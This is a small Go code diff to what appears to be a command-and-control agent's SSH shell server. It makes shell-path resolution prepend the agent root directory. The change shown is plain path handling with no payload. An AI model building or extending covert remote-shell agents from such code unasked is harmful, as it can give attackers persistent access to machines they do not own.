@@ -6,6 +6,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 
 	"github.com/creack/pty"
@@ -33,6 +34,11 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		if !util.IsCommandExist(shell) {
 			shell = "sh"
 		}
+	}
+
+	// CC doesn't know where the agent root is, so we need to prepend it
+	if strings.HasPrefix(shell, util.FileBaseName(RuntimeConfig.AgentRoot)) {
+		shell = fmt.Sprintf("%s/%s", filepath.Dir(RuntimeConfig.AgentRoot), shell)
 	}
 
 	exe, err := exec.LookPath(shell)
